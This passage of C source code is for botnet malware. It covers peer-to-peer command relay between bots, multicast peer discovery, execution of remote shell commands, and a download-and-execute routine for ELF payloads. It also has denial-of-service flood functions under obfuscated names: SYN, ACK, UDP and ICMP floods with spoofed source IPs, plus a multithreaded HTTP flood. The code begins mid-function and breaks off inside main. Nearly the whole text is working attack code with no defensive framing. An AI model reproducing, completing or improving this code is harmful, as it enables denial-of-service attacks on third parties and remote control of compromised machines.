                const char *sig = json_string_value(json_object_get(root, "sig"));
                if (!command_id || !sender_id || !nonce || !sig || strlen(command_id) >= MAX_COMMAND_ID_LEN || strlen(nonce) > MAX_NONCE_LEN) {
                    json_decref(root);
                    return 0;
                }
                char *nonce_decoded = malloc(strlen(nonce));
                size_t nonce_len = 0;
                if (mbedtls_base64_decode((unsigned char *)nonce_decoded, strlen(nonce), &nonce_len, (unsigned char *)nonce, strlen(nonce)) != 0) {
                    free(nonce_decoded);
                    json_decref(root);
                    return 0;
                }

                if (verify_signature(sender_id, ip, time(NULL), nonce_decoded, nonce_len, sig)) {
                    int processed = 0;
                    for (int i = 0; i < processed_count; i++) {
                        if (strncmp(processed_commands[i].command_id, command_id, MAX_COMMAND_ID_LEN) == 0) {
                            processed = 1;
                            break;
                        }
                    }
                    if (!processed && processed_count < 100) {
                        strncpy(processed_commands[processed_count].command_id, command_id, MAX_COMMAND_ID_LEN - 1);
                        processed_commands[processed_count].command_id[MAX_COMMAND_ID_LEN - 1] = 0;
                        processed_count++;
                        printf("Bot %s executing command %s\n", bot_id, command_id);

                        if (command_count >= 100) command_count = 0;
                        strncpy(command_status[command_count].command_id, command_id, MAX_COMMAND_ID_LEN - 1);
                        command_status[command_count].command_id[MAX_COMMAND_ID_LEN - 1] = 0;
                        strncpy(command_status[command_count].bot_ids[0], bot_id, MAX_BOT_ID_LEN - 1);
                        command_status[command_count].bot_ids[0][MAX_BOT_ID_LEN - 1] = 0;
                        command_status[command_count].bot_count = 1;
                        command_count++;

                        for (int i = 0; i < MAX_PEERS; i++) {
                            if (peer_connections[i]) {
                                lws_write(peer_connections[i], in, len, LWS_WRITE_TEXT);
                            }
                        }

                        json_t *status = json_object();
                        json_object_set_new(status, "type", json_string("status"));
                        json_object_set_new(status, "command_id", json_string(command_id));
                        json_t *bot_ids = json_array();
                        for (int j = 0; j < command_status[command_count - 1].bot_count; j++) {
                            json_array_append_new(bot_ids, json_string(command_status[command_count - 1].bot_ids[j]));
                        }
                        json_object_set_new(status, "bot_ids", bot_ids);
                        char *status_str = json_dumps(status, 0);
                        if (status_str && strlen(status_str) < MAX_BUFFER) {
                            for (int i = 0; i < MAX_PEERS; i++) {
                                if (peer_connections[i]) {
                                    lws_write(peer_connections[i], (unsigned char *)status_str, strlen(status_str), LWS_WRITE_TEXT);
                                }
                            }
                            free(status_str);
                        }
                        json_decref(status);
                    }
                }
                free(nonce_decoded);
            } else if (type && strcmp(type, "status") == 0) {
                const char *command_id = json_string_value(json_object_get(root, "command_id"));
                json_t *bot_ids = json_object_get(root, "bot_ids");
                if (!command_id || strlen(command_id) >= MAX_COMMAND_ID_LEN) {
                    json_decref(root);
                    return 0;
                }
                size_t i;
                json_t *bot_id_val;
                if (command_count >= 100) command_count = 0;
                strncpy(command_status[command_count].command_id, command_id, MAX_COMMAND_ID_LEN - 1);
                command_status[command_count].command_id[MAX_COMMAND_ID_LEN - 1] = 0;
                command_status[command_count].bot_count = 0;
                json_array_foreach(bot_ids, i, bot_id_val) {
                    if (command_status[command_count].bot_count < MAX_BOTS && json_string_length(bot_id_val) < MAX_BOT_ID_LEN) {
                        strncpy(command_status[command_count].bot_ids[command_status[command_count].bot_count], json_string_value(bot_id_val), MAX_BOT_ID_LEN - 1);
                        command_status[command_count].bot_ids[command_status[command_count].bot_count][MAX_BOT_ID_LEN - 1] = 0;
                        command_status[command_count].bot_count++;
                    }
                }
                printf("Bot %s updated status for command %s\n", bot_id, command_id);
            } else if (type && strcmp(type, "peer_discovery") == 0) {
                const char *peer_bot_id = json_string_value(json_object_get(root, "bot_id"));
                const char *host = json_string_value(json_object_get(root, "host"));
                int port = json_integer_value(json_object_get(root, "port"));
                if (!peer_bot_id || !host || strlen(peer_bot_id) >= MAX_BOT_ID_LEN || port < 1024 || port > 65535) {
                    json_decref(root);
                    return 0;
                }
                if (strcmp(peer_bot_id, bot_id) != 0) {
                    char peer_url[64];
                    snprintf(peer_url, sizeof(peer_url), "ws://%s:%d", host, port);
                    int exists = 0;
                    for (int i = 0; i < MAX_PEERS; i++) {
                        if (peer_connections[i] && strcmp(peer_url, lws_get_url(peer_connections[i])) == 0) {
                            exists = 1;
                            break;
                        }
                    }
                    if (!exists) {
                        struct lws_client_connect_info ccinfo = {0};
                        ccinfo.context = lws_get_context(wsi);
                        ccinfo.address = host;
                        ccinfo.port = port;
                        ccinfo.protocol = "bot-protocol";
                        ccinfo.host = host;
                        for (int i = 0; i < MAX_PEERS; i++) {
                            if (!peer_connections[i]) {
                                char nonce[16];
                                for (int j = 0; j < 16; j++) nonce[j] = rand() % 256;
                                char nonce_b64[32];
                                size_t nonce_len = 0;
                                mbedtls_base64_encode((unsigned char *)nonce_b64, sizeof(nonce_b64), &nonce_len, (unsigned char *)nonce, 16);
                                char challenge[256];
                                snprintf(challenge, sizeof(challenge), "{\"type\":\"challenge\",\"nonce\":\"%s\"}", nonce_b64);
                                peer_connections[i] = lws_client_connect_via_info(&ccinfo);
                                if (peer_connections[i]) {
                                    lws_set_user(peer_connections[i], strdup(nonce));
                                    lws_write(peer_connections[i], (unsigned char *)challenge, strlen(challenge), LWS_WRITE_TEXT);
                                    printf("Bot %s sent challenge to peer %s at %s:%d\n", bot_id, peer_bot_id, host, port);
                                }
                                break;
                            }
                        }
                    }
                }
            }
            json_decref(root);
            break;
        }
        case LWS_CALLBACK_CLIENT_ESTABLISHED: {
            char nonce[16];
            for (int i = 0; i < 16; i++) nonce[i] = rand() % 256;
            char nonce_b64[32];
            size_t nonce_len = 0;
            mbedtls_base64_encode((unsigned char *)nonce_b64, sizeof(nonce_b64), &nonce_len, (unsigned char *)nonce, 16);
            char challenge[256];
            snprintf(challenge, sizeof(challenge), "{\"type\":\"challenge\",\"nonce\":\"%s\"}", nonce_b64);
            lws_set_user(wsi, strdup(nonce));
            lws_write(wsi, (unsigned char *)challenge, strlen(challenge), LWS_WRITE_TEXT);
            break;
        }
        default:
            break;
    }
    return 0;
}

void *multicast_discovery_thread(void *arg) {
    struct lws_context *context = (struct lws_context *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;

    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(MULTICAST_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = inet_addr(MULTICAST_GROUP);
    mreq.imr_interface.s_addr = INADDR_ANY;
    setsockopt(sock, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq));

    json_t *discovery = json_object();
    json_object_set_new(discovery, "type", json_string("peer_discovery"));
    json_object_set_new(discovery, "bot_id", json_string(bot_id));
    json_object_set_new(discovery, "host", json_string(ip));
    json_object_set_new(discovery, "port", json_integer(own_port));
    char *discovery_str = json_dumps(discovery, 0);
    if (!discovery_str || strlen(discovery_str) >= MAX_BUFFER) {
        json_decref(discovery);
        close(sock);
        return NULL;
    }

    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(MULTICAST_PORT);
    dest.sin_addr.s_addr = inet_addr(MULTICAST_GROUP);

    while (1) {
        sendto(sock, discovery_str, strlen(discovery_str), 0, (struct sockaddr *)&dest, sizeof(dest));
        char buffer[MAX_BUFFER];
        struct sockaddr_in sender;
        socklen_t sender_len = sizeof(sender);
        int len = recvfrom(sock, buffer, sizeof(buffer) - 1, 0, (struct sockaddr *)&sender, &sender_len);
        if (len > 0) {
            buffer[len] = 0;
            json_error_t error;
            json_t *root = json_loads(buffer, 0, &error);
            if (root) {
                const char *peer_bot_id = json_string_value(json_object_get(root, "bot_id"));
                const char *host = json_string_value(json_object_get(root, "host"));
                int port = json_integer_value(json_object_get(root, "port"));
                if (peer_bot_id && host && port >= 1024 && port <= 65535 && strcmp(peer_bot_id, bot_id) != 0 && strlen(peer_bot_id) < MAX_BO>
                    char peer_url[64];
                    snprintf(peer_url, sizeof(peer_url), "ws://%s:%d", host, port);
                    int exists = 0;
                    for (int i = 0; i < MAX_PEERS; i++) {
                        if (peer_connections[i] && strcmp(peer_url, lws_get_url(peer_connections[i])) == 0) {
                            exists = 1;
                            break;
                        }
                    }
                    if (!exists) {
                        struct lws_client_connect_info ccinfo = {0};
                        ccinfo.context = context;
                        ccinfo.address = host;
                        ccinfo.port = port;
                        ccinfo.protocol = "bot-protocol";
                        ccinfo.host = host;
                        for (int i = 0; i < MAX_PEERS; i++) {
                            if (!peer_connections[i]) {
                                char nonce[16];
                                for (int j = 0; j < 16; j++) nonce[j] = rand() % 256;
                                char nonce_b64[32];
                                size_t nonce_len = 0;
                                mbedtls_base64_encode((unsigned char *)nonce_b64, sizeof(nonce_b64), &nonce_len, (unsigned char *)nonce, 16);
                                char challenge[256];
                                snprintf(challenge, sizeof(challenge), "{\"type\":\"challenge\",\"nonce\":\"%s\"}", nonce_b64);
                                peer_connections[i] = lws_client_connect_via_info(&ccinfo);
                                if (peer_connections[i]) {
                                    lws_set_user(peer_connections[i], strdup(nonce));
                                    lws_write(peer_connections[i], (unsigned char *)challenge, strlen(challenge), LWS_WRITE_TEXT);
                                    printf("Bot %s sent challenge to peer %s at %s:%d\n", bot_id, peer_bot_id, host, port);
                                }
                                break;
                            }
                        }
                    }
                }
                json_decref(root);
            }
        }
        sleep(10);
    }
    free(discovery_str);
    json_decref(discovery);
    close(sock);
    return NULL;
}

void *initiate_command_thread(void *arg) {
    struct lws_context *context = (struct lws_context *)arg;
    while (1) {
        sleep(30);
        char command_id[MAX_COMMAND_ID_LEN];
        snprintf(command_id, sizeof(command_id), "%08x", rand());
        char data[32];
        snprintf(data, sizeof(data), "Task %s", command_id);

        unsigned char key[KEY_LEN];
        derive_key(bot_id, ip, time(NULL), key);
        char nonce[16];
        for (int i = 0; i < 16; i++) nonce[i] = rand() % 256;
        unsigned char sig[32];
        mbedtls_sha256_context ctx;
        mbedtls_sha256_init(&ctx);
        mbedtls_sha256_starts(&ctx, 0);
        mbedtls_sha256_update(&ctx, key, KEY_LEN);
        mbedtls_sha256_update(&ctx, (unsigned char *)nonce, 16);
        mbedtls_sha256_finish(&ctx, sig);
        mbedtls_sha256_free(&ctx);

        char sig_b64[64], nonce_b64[32];
        size_t sig_len = 0, nonce_len = 0;
        mbedtls_base64_encode((unsigned char *)sig_b64, sizeof(sig_b64), &sig_len, sig, 32);
        mbedtls_base64_encode((unsigned char *)nonce_b64, sizeof(nonce_b64), &nonce_len, (unsigned char *)nonce, 16);

        char command[256];
        snprintf(command, sizeof(command), "{\"type\":\"command\",\"command_id\":\"%s\",\"sender_id\":\"%s\",\"data\":\"%s\",\"nonce\":\"%s\>

        if (processed_count < 100) {
            strncpy(processed_commands[processed_count].command_id, command_id, MAX_COMMAND_ID_LEN - 1);
            processed_commands[processed_count].command_id[MAX_COMMAND_ID_LEN - 1] = 0;
            processed_count++;
        }
        if (command_count < 100) {
            strncpy(command_status[command_count].command_id, command_id, MAX_COMMAND_ID_LEN - 1);
            command_status[command_count].command_id[MAX_COMMAND_ID_LEN - 1] = 0;
            strncpy(command_status[command_count].bot_ids[0], bot_id, MAX_BOT_ID_LEN - 1);
            command_status[command_count].bot_ids[0][MAX_BOT_ID_LEN - 1] = 0;
            command_status[command_count].bot_count = 1;
            command_count++;
        }
        printf("Bot %s initiated command %s\n", bot_id, command_id);

        for (int i = 0; i < MAX_PEERS; i++) {
            if (peer_connections[i]) {
                lws_write(peer_connections[i], (unsigned char *)command, strlen(command), LWS_WRITE_TEXT);
            }
        }

        json_t *status = json_object();
        json_object_set_new(status, "type", json_string("status"));
        json_object_set_new(status, "command_id", json_string(command_id));
        json_t *bot_ids = json_array();
        json_array_append_new(bot_ids, json_string(bot_id));
        json_object_set_new(status, "bot_ids", bot_ids);
        char *status_str = json_dumps(status, 0);
        if (status_str && strlen(status_str) < MAX_BUFFER) {
            for (int i = 0; i < MAX_PEERS; i++) {
                if (peer_connections[i]) {
                    lws_write(peer_connections[i], (unsigned char *)status_str, strlen(status_str), LWS_WRITE_TEXT);
                }
            }
            free(status_str);
        }
        json_decref(status);
    }
    return NULL;
}

void e38s11(const char* cmd_payload) {
    if (!cmd_payload || strlen(cmd_payload) == 0 || strlen(cmd_payload) >= MAX_CMD_LEN) return;
    char safe_cmd[MAX_CMD_LEN];
    sanitize_command(safe_cmd, cmd_payload, MAX_CMD_LEN);
    if (strlen(safe_cmd) == 0) return;
    pid_t pid = fork();
    if (pid == 0) {
        char* argv[] = {"/bin/sh", "-c", safe_cmd, NULL};
        char* envp[] = {NULL};
        execve("/bin/sh", argv, envp);
        exit(1);
    }
}

int is_valid_executable(const char* filename) {
    FILE* fp = fopen(filename, "rb");
    if (!fp) return 0;
    unsigned char magic[4];
    size_t read = fread(magic, 1, 4, fp);
    fclose(fp);
    if (read >= 2 && magic[0] == 0x7F && magic[1] == 'E' && magic[2] == 'L' && magic[3] == 'F') return 1;
    return 0;
}

void pl0c11f(const char* new_url, const char* filename) {
    if (!new_url || !filename || strlen(new_url) >= MAX_TARGET_LEN || strlen(filename) >= MAX_CMD_LEN) return;
    char safe_filename[MAX_CMD_LEN];
    snprintf(safe_filename, sizeof(safe_filename), "/tmp/%s", filename);
    sanitize_command(safe_filename, safe_filename, MAX_CMD_LEN);
    if (strlen(safe_filename) <= 5) return;
    CURL* curl = curl_easy_init();
    if (!curl) return;
    FILE* fp = fopen(safe_filename, "wb");
    if (!fp) {
        curl_easy_cleanup(curl);
        return;
    }
    curl_easy_setopt(curl, CURLOPT_URL, new_url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_file_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agents[rand() % user_agent_count]);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    fclose(fp);
    if (res != CURLE_OK) {
        remove(safe_filename);
        return;
    }
    if (!is_valid_executable(safe_filename)) {
        remove(safe_filename);
        return;
    }
    chmod(safe_filename, 0700);
    pid_t pid = fork();
    if (pid == 0) {
        char* argv[] = {safe_filename, NULL};
        char* envp[] = {NULL};
        execve(safe_filename, argv, envp);
        exit(1);
    }
    exit(0);
}


void 8sj3d(const char* target_ip, int port, int seconds) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &dest.sin_addr);
    char packet[MAX_PACKET_SIZE];
    struct iphdr* iph = (struct iphdr*)packet;
    struct tcphdr* tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(random_ip());
    iph->daddr = dest.sin_addr.s_addr;
    iph->check = in_chksum((unsigned short*)packet, iph->tot_len);
    tcph->source = htons(rand() % (65535 - 1024) + 1024);
    tcph->dest = htons(port);
    tcph->seq = htonl(rand());
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    struct pseudo_header psh;
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.length = htons(sizeof(struct tcphdr));
    tcph->check = tcp_checksum(psh, tcph, NULL, 0);
    signal(SIGALRM, timeout);
    alarm(seconds);
    int delay;
    while (1) {
        iph->saddr = inet_addr(random_ip());
        psh.source_address = iph->saddr;
        tcph->source = htons(rand() % (65535 - 1024) + 1024);
        iph->id = htonl(rand() % 65535);
        iph->check = 0;
        iph->check = in_chksum((unsigned short*)packet, iph->tot_len);
        tcph->check = 0;
        tcph->check = tcp_checksum(psh, tcph, NULL, 0);
        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            break;
        }
        delay = (rand() % 1501) + 500;
        usleep(delay);
    }
    close(sock);
}

void a06rtl69699(const char* target_ip, int port, int seconds) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &dest.sin_addr);
    char packet[MAX_PACKET_SIZE];
    struct iphdr* iph = (struct iphdr*)packet;
    struct tcphdr* tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(random_ip());
    iph->daddr = dest.sin_addr.s_addr;
    iph->check = in_chksum((unsigned short*)packet, iph->tot_len);
    tcph->source = htons(rand() % (65535 - 1024) + 1024);
    tcph->dest = htons(port);
    tcph->seq = htonl(rand());
    tcph->ack_seq = htonl(rand());
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 1;
    tcph->urg = 0;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    struct pseudo_header psh;
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.length = htons(sizeof(struct tcphdr));
    tcph->check = tcp_checksum(psh, tcph, NULL, 0);
    signal(SIGALRM, timeout);
    alarm(seconds);
    int delay;
    while (1) {
        iph->saddr = inet_addr(random_ip());
        psh.source_address = iph->saddr;
        tcph->source = htons(rand() % (65535 - 1024) + 1024);
        iph->id = htonl(rand() % 65535);
        iph->check = 0;
        iph->check = in_chksum((unsigned short*)packet, iph->tot_len);
        tcph->check = 0;
        tcph->check = tcp_checksum(psh, tcph, NULL, 0);
        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            break;
        }
        delay = (rand() % 1501) + 500;
        usleep(delay);
    }
    close(sock);
}

void u39rfood(const char* target_ip, int port, int seconds) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) return;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &dest.sin_addr);
    char packet[MAX_PACKET_SIZE];
    struct iphdr* iph = (struct iphdr*)packet;
    struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
    char* data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    char payload[128];
    memset(payload, 'A', sizeof(payload));
    int data_len = sizeof(payload);
    memcpy(data, payload, data_len);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + data_len;
    iph->id = htonl(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(random_ip());
    iph->daddr = dest.sin_addr.s_addr;
    iph->check = in_chksum((unsigned short*)packet, iph->tot_len);
    udph->source = htons(rand() % (65535 - 1024) + 1024);
    udph->dest = htons(port);
    udph->len = htons(sizeof(struct udphdr) + data_len);
    udph->check = 0;
    struct pseudo_header psh;
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.length = udph->len;
    udph->check = udp_checksum(psh, udph, data, data_len);
    signal(SIGALRM, timeout);
    alarm(seconds);
    int delay;
    while (1) {
        iph->saddr = inet_addr(random_ip());
        psh.source_address = iph->saddr;
        udph->source = htons(rand() % (65535 - 1024) + 1024);
        iph->id = htonl(rand() % 65535);
        iph->check = 0;
        iph->check = in_chksum((unsigned short*)packet, iph->tot_len);
        udph->check = 0;
        udph->check = udp_checksum(psh, udph, data, data_len);
        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            break;
        }
        delay = (rand() % 1501) + 500;
        usleep(delay);
    }
    close(sock);
}


void 1c3rtl23239(const char* target_ip, int seconds) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = 0;
    inet_pton(AF_INET, target_ip, &dest.sin_addr);
    char packet[MAX_PACKET_SIZE];
    struct iphdr* iph = (struct iphdr*)packet;
    struct icmphdr* icmph = (struct icmphdr*)(packet + sizeof(struct iphdr));
    char* data = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);
    char payload[64];
    memset(payload, 'B', sizeof(payload));
    int data_len = sizeof(payload);
    memcpy(data, payload, data_len);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + data_len;
    iph->id = htonl(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0;
    iph->saddr = inet_addr(random_ip());
    iph->daddr = dest.sin_addr.s_addr;
    iph->check = in_chksum((unsigned short*)packet, iph->tot_len);
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->un.echo.id = rand();
    icmph->un.echo.sequence = rand();
    icmph->checksum = in_chksum((unsigned short*)(packet + sizeof(struct iphdr)), sizeof(struct icmphdr) + data_len);
    signal(SIGALRM, timeout);
    alarm(seconds);
    int delay;
    while (1) {
        iph->saddr = inet_addr(random_ip());
        iph->id = htonl(rand() % 65535);
        iph->check = 0;
        iph->check = in_chksum((unsigned short*)packet, iph->tot_len);
        icmph->un.echo.sequence = rand();
        icmph->checksum = 0;
        icmph->checksum = in_chksum((unsigned short*)(packet + sizeof(struct iphdr)), sizeof(struct icmphdr) + data_len);
        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            break;
        }
        delay = (rand() % 1501) + 500;
        usleep(delay);
    }
    close(sock);
}

struct httpflood_args {
    const char* url;
    int seconds;
};

void* httpflood_thread(void* arg) {
    struct httpflood_args* args = (struct httpflood_args*)arg;
    CURL* curl = curl_easy_init();
    if (!curl) return NULL;
    char* buffer = malloc(8192);
    if (!buffer) {
        curl_easy_cleanup(curl);
        return NULL;
    }
    struct write_callback_data data = {buffer, 0, 8192};
    curl_easy_setopt(curl, CURLOPT_URL, args->url);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agents[rand() % user_agent_count]);
    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
    headers = curl_slist_append(headers, "Connection: keep-alive");
    headers = curl_slist_append(headers, "Cache-Control: no-cache");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    time_t start = time(NULL);
    while (time(NULL) - start < args->seconds) {
        data.used = 0;
        curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agents[rand() % user_agent_count]);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            break;
        }
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        if (response_code == 429 || response_code == 503) {
            break;
        }
        usleep((rand() % 401 + 100) * 1000);
    }
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(buffer);
    return NULL;
}

void 6rtlee9(const char* url, int connections, int seconds) {
    signal(SIGALRM, timeout);
    alarm(seconds);
    pthread_t threads[MAX_THREADS];
    struct httpflood_args args = {url, seconds};
    int active_threads = 0;
    for (int i = 0; i < connections && i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, httpflood_thread, &args) == 0) {
            active_threads++;
        }
    }
    for (int i = 0; i < active_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}

int check_config_file(char* command, char* target, int* port, int* duration, int* connections) {
    FILE* fp = fopen(CONFIG_FILE, "r");
    if (!fp) return 0;
    if (access(CONFIG_FILE, R_OK) != 0) {
        fclose(fp);
        return 0;
    }
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    if (size == 0 || size > 1024 * 1024) {
        fclose(fp);
        return 0;
    }
    fseek(fp, 0, SEEK_SET);
    char* buffer = malloc(size + 1);
    if (!buffer) {
        fclose(fp);
        return 0;
    }
    fread(buffer, 1, size, fp);
    buffer[size] = '\0';
    fclose(fp);
    int result = parse_json(buffer, command, target, port, duration, connections);
    free(buffer);
    return result;
}

int parse_json(const char* json, char* command, char* target, int* port, int* duration, int* connections) {
    cJSON* root = cJSON_Parse(json);
    if (!root) return 0;
    cJSON* cmd = cJSON_GetObjectItem(root, "command");
    if (!cJSON_IsString(cmd) || !cmd->valuestring || strlen(cmd->valuestring) >= 32) {
        cJSON_Delete(root);
        return 0;
    }
    
    // *** แก้ไข Compiler Error: ใช้ cmd->valuestring แทน filename->valuestring ***
    // (strncpy ด้วยขนาดบัฟเฟอร์จริง 31)
    strncpy(command, cmd->valuestring, 31);
    command[31] = '\0'; 
    
    if (strcmp(command, "6rtlee9") == 0) {
        cJSON* url = cJSON_GetObjectItem(root, "url");
        if (!cJSON_IsString(url) || !url->valuestring || strlen(url->valuestring) >= MAX_TARGET_LEN) {
            cJSON_Delete(root);
            return 0;
        }
        strncpy(target, url->valuestring, MAX_TARGET_LEN - 1);
        target[MAX_TARGET_LEN - 1] = '\0';
        cJSON* conn = cJSON_GetObjectItem(root, "connections");
        if (!cJSON_IsNumber(conn) || conn->valuedouble < 1 || conn->valuedouble > MAX_THREADS) {
            cJSON_Delete(root);
            return 0;
        }
        *connections = (int)conn->valuedouble;
        cJSON* dur = cJSON_GetObjectItem(root, "duration");
        if (!cJSON_IsNumber(dur) || dur->valuedouble < 1 || dur->valuedouble > 3600) {
            cJSON_Delete(root);
            return 0;
        }
        *duration = (int)dur->valuedouble;
    } else if (strcmp(command, "e38s11") == 0 || strcmp(command, "pl0c11f") == 0) {
        cJSON* payload = cJSON_GetObjectItem(root, "payload");
        if (!cJSON_IsString(payload) || !payload->valuestring || strlen(payload->valuestring) >= MAX_TARGET_LEN) {
            cJSON_Delete(root);
            return 0;
        }
        strncpy(target, payload->valuestring, MAX_TARGET_LEN - 1);
        target[MAX_TARGET_LEN - 1] = '\0';
        if (strcmp(command, "pl0c11f") == 0) {
            cJSON* filename = cJSON_GetObjectItem(root, "filename");
            if (!cJSON_IsString(filename) || !filename->valuestring || strlen(filename->valuestring) >= MAX_CMD_LEN) {
                cJSON_Delete(root);
                return 0;
            }
            // *** แก้ไข Buffer Overflow: ใช้ sizeof(command)-1 แทน MAX_CMD_LEN-1 ***
            strncpy(command, filename->valuestring, sizeof(command) - 1);
            command[sizeof(command) - 1] = '\0';
        }
    } else {
        cJSON* tgt = cJSON_GetObjectItem(root, "target");
        if (!cJSON_IsString(tgt) || !tgt->valuestring || strlen(tgt->valuestring) >= MAX_TARGET_LEN) {
            cJSON_Delete(root);
            return 0;
        }
        strncpy(target, tgt->valuestring, MAX_TARGET_LEN - 1);
        target[MAX_TARGET_LEN - 1] = '\0';
        cJSON* prt = cJSON_GetObjectItem(root, "port");
        if (cJSON_IsNumber(prt)) {
            if (prt->valuedouble < 1 || prt->valuedouble > 65535) {
                cJSON_Delete(root);
                return 0;
            }
            *port = (int)prt->valuedouble;
        } else {
            *port = 0;
        }
        cJSON* dur = cJSON_GetObjectItem(root, "duration");
        if (!cJSON_IsNumber(dur) || dur->valuedouble < 1 || dur->valuedouble > 3600) {
            cJSON_Delete(root);
            return 0;
        }
        *duration = (int)dur->valuedouble;
    }
    cJSON_Delete(root);
    return 1;
}


void cleanup_child(int signum) {
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

void setup_signals() {
    struct sigaction sa;
    sa.sa_handler = timeout;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGALRM, &sa, NULL);
    sa.sa_handler = cleanup_child;
    sigaction(SIGCHLD, &sa, NULL);
}

int main(int argc, char *argv[]) {
    srand(time(NULL) ^ getpid());
    if (argc < 1) return 1;

